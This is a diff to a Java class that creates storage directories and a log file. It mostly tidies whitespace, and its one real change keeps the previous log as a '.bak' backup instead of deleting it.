@@ -28,13 +28,13 @@ public class Path {
 	private static final String TAG = "PATH"; //$NON-NLS-1$
 
 	/** The Constant CONF_DIR. */
-	private static  String CONF_DIR ; //$NON-NLS-1$
+	private static String CONF_DIR; //$NON-NLS-1$
 	// public static final String DEBUG_DIR = "dwm/";
 	/** The Constant MARKUP_DIR. */
-	private static  String MARKUP_DIR; //$NON-NLS-1$
+	private static String MARKUP_DIR; //$NON-NLS-1$
 
 	/** The Constant LOG_DIR. */
-	private static  String LOG_DIR; //$NON-NLS-1$
+	private static String LOG_DIR; //$NON-NLS-1$
 
 	public static final String LOG_FILE = "logs.txt"; //$NON-NLS-1$
 
@@ -73,12 +73,12 @@ public class Path {
 
 		/** The Constant LOG_DIR. */
 		LOG_DIR = Messages.getString("24.2"); //$NON-NLS-1$
-		
+
 		try {
 			if (haveStorage()) {
 
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (makeDirs): hidden = " + hidden()) ;//$NON-NLS-1$
+					Check.log(TAG + " (makeDirs): hidden = " + hidden());//$NON-NLS-1$
 				}
 				createDirectory(conf());
 				createDirectory(markup());
@@ -86,7 +86,13 @@ public class Path {
 
 				if (Cfg.FILE) {
 					final File file = new File(logs(), LOG_FILE);
-					file.delete();
+					final File bak = new File(logs(), LOG_FILE + ".bak");
+					if(bak.exists()){
+						bak.delete();
+					}
+					if (file.exists()) {						
+						file.renameTo(bak);
+					}
 					file.createNewFile();
 				}
 
@@ -94,7 +100,7 @@ public class Path {
 			}
 		} catch (final Exception e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + e.toString()) ;//$NON-NLS-1$
+				Check.log(TAG + " Error: " + e.toString());//$NON-NLS-1$
 			}
 		}
 		return false;
@@ -194,12 +200,12 @@ public class Path {
 			final long bytesAvailable = (long) stat.getBlockSize() * (long) stat.getBlockCount();
 			final long megAvailable = bytesAvailable / 1048576;
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (freeSpace): " + megAvailable + " MiB") ;//$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(TAG + " (freeSpace): " + megAvailable + " MiB");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			return bytesAvailable;
 		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (freeSpace) Error: no external path") ;//$NON-NLS-1$
+				Check.log(TAG + " (freeSpace) Error: no external path");//$NON-NLS-1$
 			}
 			return 0;
 		}
